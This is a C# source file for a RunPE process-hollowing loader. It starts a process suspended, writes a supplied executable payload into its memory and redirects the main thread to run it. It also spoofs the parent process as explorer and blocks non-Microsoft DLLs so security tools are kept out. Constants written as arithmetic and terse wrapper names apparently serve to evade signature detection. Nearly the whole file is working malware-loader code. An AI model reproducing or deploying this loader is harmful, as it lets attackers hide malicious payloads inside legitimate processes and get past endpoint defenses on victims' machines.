using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using RunPE;

//Use : Runpe.Class1.Execute
namespace Runpe
{
    public class Class1 : Api
    {
        public static Startupinfoex si = new Startupinfoex();
        public static ProcessInformation pi = new ProcessInformation();

        public static void Execute(string path, byte[] payload)
        {
            int lireEcrire = 1+1-2;
            RunSpoofing();
            CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED | CreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref si, ref pi);
            Console.WriteLine("[*] Process Created. Process ID: {0}", pi.dwProcessId);
            int[] context = new int[179];
            context[0] = 65000+538;
            Helper.Gtc(context);
            int ebx = context[41] + 8;
            int baseAdress = 5-5;
            int bufferSize = 2*2;
            Helper.Rpm(ebx, baseAdress, bufferSize, lireEcrire);
            int fileAdress = BitConverter.ToInt32(payload, 30*2);
            int imageBase = BitConverter.ToInt32(payload, 100+12);
            int sizeOfImage = BitConverter.ToInt32(payload, fileAdress + 40*2);
            int sizeOfHeader = BitConverter.ToInt32(payload, fileAdress + 40*2+4);
            int type = 12000+288;
            int protect = 32*2;
            int newImageBase = Helper.Vae(imageBase, sizeOfImage, type, protect);
            Helper.Wpm(newImageBase, payload, sizeOfHeader, lireEcrire, fileAdress, ebx, bufferSize);
            int adressOfEntryPoint = BitConverter.ToInt32(payload, fileAdress + 200-100);
            context[22+22] = newImageBase + adressOfEntryPoint;
            Helper.Stc(context);
            Helper.Rt();
        }
        static void RunSpoofing()
        {
            var process = Process.GetProcessesByName("explorer");
            int parentProc = 0;
            foreach (var p in process)
            {
                parentProc += p.Id;
            }

            Console.WriteLine("[*] New Parent PID Found: {0}", parentProc);

            IntPtr procHandle = OpenProcess(ProcessAccessFlags.CreateProcess, false, parentProc);

            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);

            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, ref lpSize);

            IntPtr lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValueProc, procHandle);
            UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
            UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, lpMitigationPolicy, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
        }
    }
}